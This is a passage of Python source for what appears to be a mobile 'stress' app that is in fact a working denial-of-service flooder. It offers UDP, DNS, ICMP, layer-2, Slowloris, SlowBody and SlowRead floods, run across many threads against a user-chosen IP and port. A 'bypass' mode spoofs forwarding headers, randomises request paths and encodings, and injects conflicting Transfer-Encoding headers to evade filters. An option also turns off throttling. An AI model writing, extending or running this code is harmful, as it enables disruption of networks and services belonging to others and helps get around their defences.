        icmp_available = l2_available
        children = [
            ui.card([ui.text(self.L("mx_title"), "titleMedium"), ui.text(self.L("mx_sub"), "bodySmall")]),
            ui.card([
                ui.text(self.L("mx_udp"), "titleSmall"),
                ui.switch(checked=self.mixed_udp, on_change=lambda v: self._set_mixed_setting("mixed_udp", v), title=self.L("v_udp"), subtitle=self.L("v_udp_sub")),
                ui.switch(checked=self.mixed_dns, on_change=lambda v: self._set_mixed_setting("mixed_dns", v), title=self.L("v_dns"), subtitle=self.L("v_dns_sub")),
                ui.switch(checked=self.mixed_ssdp, on_change=lambda v: self._set_mixed_setting("mixed_ssdp", v), title=self.L("v_ssdp"), subtitle=self.L("v_ssdp_sub")),
                ui.switch(checked=self.mixed_upnp, on_change=lambda v: self._set_mixed_setting("mixed_upnp", v), title=self.L("v_upnp"), subtitle=self.L("v_upnp_sub")),
                ui.switch(checked=self.mixed_icmp and icmp_available, on_change=lambda v: self._set_mixed_setting("mixed_icmp", v) if icmp_available else None, title=self.L("v_icmp"), subtitle=self.L("v_icmp_sub"), enabled=icmp_available),
                ui.switch(checked=self.mixed_l2 and l2_available, on_change=lambda v: self._set_mixed_setting("mixed_l2", v) if l2_available else None, title=self.L("v_l2"), subtitle=self.L("v_l2_sub"), enabled=l2_available)
            ]),
            ui.card([
                ui.text(self.L("mx_tcp"), "titleSmall"),
                ui.switch(checked=self.mixed_connect, on_change=lambda v: self._set_mixed_setting("mixed_connect", v), title=self.L("v_con"), subtitle=self.L("v_con_sub")),
                ui.switch(checked=self.mixed_http, on_change=lambda v: self._set_mixed_setting("mixed_http", v), title=self.L("v_http"), subtitle=self.L("v_http_sub")),
                ui.switch(checked=self.mixed_hold, on_change=lambda v: self._set_mixed_setting("mixed_hold", v), title=self.L("v_hold"), subtitle=self.L("v_hold_sub")),
                ui.switch(checked=self.mixed_slowloris, on_change=lambda v: self._set_mixed_setting("mixed_slowloris", v), title=self.L("v_slor"), subtitle=self.L("v_slor_sub")),
                ui.switch(checked=self.mixed_slowbody, on_change=lambda v: self._set_mixed_setting("mixed_slowbody", v), title=self.L("v_slbo"), subtitle=self.L("v_slbo_sub")),
                ui.switch(checked=self.mixed_slowread, on_change=lambda v: self._set_mixed_setting("mixed_slowread", v), title=self.L("v_slrd"), subtitle=self.L("v_slrd_sub"))
            ]),
            ui.card([ui.button(self.L("mx_save"), on_click=lambda: self.navigate("main"), style="filled", fill_max_width=True)]),
            ui.card([ui.text(self.L("mx_count", t=len(self._get_mixed_tcp_methods()), u=len(self._get_mixed_udp_methods())), "bodyMedium")])
        ]
        return ui.scaffold(title=self.L("mx_title"), content=ui.column(children, padding=16, spacing=12))

    def _open_mixed_settings(self): self.navigate("mixed_settings")

    def _set_mixed_setting(self, key, value):
        val = bool(value)
        mapping = {"mixed_udp": "mixed_udp", "mixed_connect": "mixed_connect", "mixed_http": "mixed_http",
                   "mixed_hold": "mixed_hold", "mixed_slowloris": "mixed_slowloris", "mixed_slowbody": "mixed_slowbody",
                   "mixed_slowread": "mixed_slowread", "mixed_upnp": "mixed_upnp", "mixed_ssdp": "mixed_ssdp",
                   "mixed_dns": "mixed_dns", "mixed_icmp": "mixed_icmp", "mixed_l2": "mixed_l2"}
        if key not in mapping: return
        setattr(self, mapping[key], val)
        self.set_setting(key, val)
        self.refresh()

    def _set_method(self, method):
        if method == "L2 (Root)" and not (self.has_root or self.has_shizuku):
            self.toast(self.L("t_need_l2"))
            if self._shizuku_service: self._request_shizuku_permission()
            return
        if method == "ICMP" and not (self.has_root or self.has_shizuku):
            self.toast(self.L("t_need_icmp"))
            if self._shizuku_service: self._request_shizuku_permission()
            return
        self.method = method
        self.set_setting("method", method)
        self.refresh()

    def _set_gateway(self, value):
        self.gateway = value.strip()
        if not self.gateway or is_valid_ip(self.gateway):
            self.set_setting("gateway", self.gateway)

    def _set_port(self, value):
        try:
            p = int(str(value).strip())
            if 1 <= p <= 65535:
                self.port = p
                self.set_setting("port", self.port)
        except Exception: pass

    def _set_udp_threads(self, value):
        max_udp, _ = self._get_max_limits()
        self.udp_threads = max(16, min(max_udp, int(value)))
        self.set_setting("udp_threads", self.udp_threads)
        self.refresh()

    def _set_tcp_threads(self, value):
        _, max_tcp = self._get_max_limits()
        self.tcp_threads = max(4, min(max_tcp, int(value)))
        self.set_setting("tcp_threads", self.tcp_threads)
        self.refresh()
        
    def _set_high_limit(self, value):
        self.high_limit_mode = bool(value)
        self.set_setting("high_limit_mode", self.high_limit_mode)
        self.refresh()

    def _set_duration(self, value):
        try:
            val_str = str(value).strip()
            d = int(float(val_str)) if "." in val_str else int(val_str)
            if d >= 0:
                self.duration = d
                self.set_setting("duration", self.duration)
                self.refresh()
        except Exception: pass

    def _set_throttle(self, value):
        self.throttle_ignore = bool(value)
        self.set_setting("throttle_ignore", self.throttle_ignore)
        self.refresh()

    def _set_bypass_mode(self, value):
        self.bypass_mode = bool(value)
        self.set_setting("bypass_mode", self.bypass_mode)
        self.refresh()

    def _get_evasion_request_parts(self):
        if not self.bypass_mode:
            req = f"GET / HTTP/1.1\r\nHost: {self.gateway}\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n".encode()
            return [req]
        method = random.choice(["GET", "POST", "HEAD", "OPTIONS"])
        base_path = random.choice(HTTP_PATHS)
        path_chars = []
        for char in base_path:
            r = random.random()
            if r < 0.25: path_chars.append(f"%{ord(char):02x}")
            elif r < 0.4: path_chars.append(f"%{ord(char):02X}")
            elif r < 0.5: path_chars.append(char.upper() if char.isalpha() else char)
            else: path_chars.append(char)
        path = "".join(path_chars)
        path += f"?_nc={random.randint(10000, 99999)}&t={int(time.time())}&r={os.urandom(4).hex()}"
        
        octets = self.gateway.split('.')
        subnet = ".".join(octets[:3]) if len(octets) == 4 else "192.168.1"
        fake_ip = f"{subnet}.{random.randint(2, 254)}"
        
        ua = generate_random_user_agent()
        header_pool = [
            f"X-Forwarded-For: {fake_ip}", f"Client-IP: {fake_ip}", f"X-Real-IP: {fake_ip}",
            f"X-Original-URL: {base_path}", f"X-Rewrite-URL: {base_path}", f"X-Override-URL: {base_path}",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8", "Accept-Encoding: gzip, deflate, br",
            "Cache-Control: no-cache, no-store, must-revalidate", "Pragma: no-cache",
            f"Cookie: session_id={os.urandom(8).hex()}; lang=ru", "Sec-CH-UA-Mobile: ?0",
            "Sec-CH-UA-Platform: \"Windows\"", "Sec-Fetch-Dest: document", "Sec-Fetch-Mode: navigate",
            "Connection: keep-alive"
        ]
        if random.random() < 0.3:
            header_pool.append("Transfer-Encoding: chunked")
            header_pool.append("Transfer-Encoding: identity")
        random.shuffle(header_pool)
        http_ver = random.choice(["HTTP/1.1", "HTTP/1.1", "HTTP/1.1", "HTTP/1.0"])
        part1 = f"{method} {path} {http_ver}\r\nHost: {self.gateway}\r\nUser-Agent: {ua}\r\n".encode()
        part2 = ("\r\n".join(header_pool) + "\r\n\r\n").encode()
        return [part1, part2]

    def _toggle_stress(self):
        if self.running: self._stop_stress()
        else: self._start_stress()

    def _start_stress(self):
        if not self._stress_lock.acquire(blocking=False): return
        try:
            if self.running: return
            if not self.gateway or not is_valid_ip(self.gateway):
                self.toast(self.L("t_ip_bad"))
                self._log(self.L("l_ip_bad"), "ERR")
                return
            if self.method == "L2 (Root)" and not (self.has_root or self.has_shizuku):
                self.toast(self.L("t_need_l2"))
                self._log(self.L("l_l2_denied"), "ERR")
                if self._shizuku_service: self._request_shizuku_permission()
                return
            if self.method == "ICMP" and not (self.has_root or self.has_shizuku):
                self.toast(self.L("t_need_icmp"))
                self._log(self.L("l_icmp_denied"), "ERR")
                if self._shizuku_service: self._request_shizuku_permission()
                return
            self.running = True
            self.stop_flag = False
            self.time_left = self.duration
            self.pps = 0
            self.pps_history = []
            self._last_l2_time = 0.0
            self._set_vitality("vit_measuring")
            with self.stats_lock: self.stats = {k: 0 for k in self.stats}
            self.threads = []
            self.sockets = []
            dur_str = f"{self.duration}s" if self.duration > 0 else "inf"
            bypass_str = " [Bypass 5.0]" if self.bypass_mode else ""
            threading.Thread(target=self._ui_and_timer_loop, daemon=True).start()
            threading.Thread(target=self._vitality_monitor_loop, daemon=True).start()
            if self.method == "Mixed":
                tcp_methods = self._get_mixed_tcp_methods()
                udp_methods = self._get_mixed_udp_methods()
                if not tcp_methods and not udp_methods:
                    self.toast(self.L("t_mix_empty"))
                    self.running = False
                    return
                self._log(self.L("l_start_mix", b=bypass_str, t=self.tcp_threads, u=self.udp_threads, g=self.gateway, p=self.port), "OK")
                if tcp_methods: threading.Thread(target=self._spawn_workers_async, args=(self._mixed_tcp_worker, self.tcp_threads), daemon=True).start()
                if udp_methods: threading.Thread(target=self._spawn_workers_async, args=(self._mixed_udp_worker, self.udp_threads), daemon=True).start()
                self.toast(self.L("t_start_mix", t=self.tcp_threads, u=self.udp_threads))
            else:
                method_map = {
                    "UDP": self._udp_worker, "CONNECT": self._connect_worker, "HTTP": self._http_worker,
                    "Hold": self._hold_worker, "Slowloris": self._slowloris_worker, "SlowBody": self._slowbody_worker,
                    "SlowRead": self._slowread_worker, "UPnP XML": self._upnp_worker, "SSDP": self._ssdp_worker,
                    "DNS Flood": self._dns_worker, "ICMP": self._icmp_worker, "L2 (Root)": self._l2_worker
                }
                worker = method_map.get(self.method, self._udp_worker)
                is_tcp_single = (self.method in ["CONNECT", "HTTP", "Hold", "Slowloris", "SlowBody", "SlowRead"])
                threads_to_spawn = self.tcp_threads if is_tcp_single else self.udp_threads
                self._log(self.L("l_start", m=self.method, b=bypass_str, n=threads_to_spawn, d=dur_str, g=self.gateway, p=self.port), "OK")
                threading.Thread(target=self._spawn_workers_async, args=(worker, threads_to_spawn), daemon=True).start()
                self.toast(self.L("t_start", m=self.method, n=threads_to_spawn))
            self.refresh()
        finally: self._stress_lock.release()

    def _spawn_workers_async(self, worker, target_count):
        for i in range(target_count):
            if self.stop_flag: break
            try:
                t = threading.Thread(target=worker, args=(i,), daemon=True)
                t.start()
                self.threads.append(t)
            except Exception as e:
                self._record_error("ThreadSpawn", e)
                break
            if i % 30 == 0: time.sleep(0.002)

    def _stop_stress(self):
        if not self.running and not self.stop_flag: return
        self.stop_flag = True
        self.running = False
        
        peak_snapshot = max(self.pps_history) if self.pps_history else self.pps
        self.pps = 0
        self._log(self.L("l_stop", s=self.stats), "INFO")
        self._save_session(peak_snapshot)
        
        def cleanup_worker():
            with self.sockets_lock:
                for sock in list(self.sockets): self._safe_close_socket(sock)
                self.sockets.clear()
            self.threads.clear()
            self._log(self.L("l_cleanup"), "OK")
            self.refresh()
        threading.Thread(target=cleanup_worker, daemon=True).start()
        self.refresh()
        self.toast(self.L("t_stop"))

    def _udp_worker(self, idx):
        if not is_valid_ip(self.gateway): return
        target = (self.gateway, self.port)
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setblocking(False)
            with self.sockets_lock: self.sockets.append(sock)
        except Exception as e:
            self._record_error("UDP_Init", e)
            return
        
        local_sent = 0
        batch_size = 30
        while not self.stop_flag:
            try:
                for _ in range(batch_size):
                    pkt = random.choice([build_random_dns_query(), JUNK_PAYLOADS[0]]) if (self.bypass_mode or self.port == 53) else random.choice(JUNK_PAYLOADS)
                    try:
                        sock.sendto(pkt, target)
                        local_sent += 1
                    except (BlockingIOError, socket.error):
                        time.sleep(0.001)
                        break
                
                if local_sent > 0:
                    with self.stats_lock: self.stats["udp"] += local_sent
                    local_sent = 0
                    
                if not self.throttle_ignore: time.sleep(0.002)
            except Exception as e:
                if idx == 0 and random.random() < 0.05: self._record_error("UDP", e)
                time.sleep(0.01)
                break
                
        if local_sent > 0:
            with self.stats_lock: self.stats["udp"] += local_sent
        self._safe_close_socket(sock)
        with self.sockets_lock:
            if sock in self.sockets: self.sockets.remove(sock)

    def _dns_worker(self, idx):
        if not is_valid_ip(self.gateway): return
        target = (self.gateway, 53 if self.port == 80 else self.port)
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setblocking(False)
            with self.sockets_lock: self.sockets.append(sock)
        except Exception as e:
            self._record_error("DNS_Init", e)
            return
            
        local_sent = 0
        batch_size = 30
        while not self.stop_flag:
            try:
                for _ in range(batch_size):
                    try:
                        sock.sendto(build_random_dns_query(), target)
                        local_sent += 1
                    except (BlockingIOError, socket.error):
                        time.sleep(0.001)
                        break
                        
                if local_sent > 0:
                    with self.stats_lock: self.stats["dns"] += local_sent
                    local_sent = 0
                    
                if not self.throttle_ignore: time.sleep(0.002)
            except Exception as e:
                if idx == 0 and random.random() < 0.05: self._record_error("DNS", e)
                time.sleep(0.01)
                break
                
        if local_sent > 0:
            with self.stats_lock: self.stats["dns"] += local_sent
        self._safe_close_socket(sock)
        with self.sockets_lock:
            if sock in self.sockets: self.sockets.remove(sock)

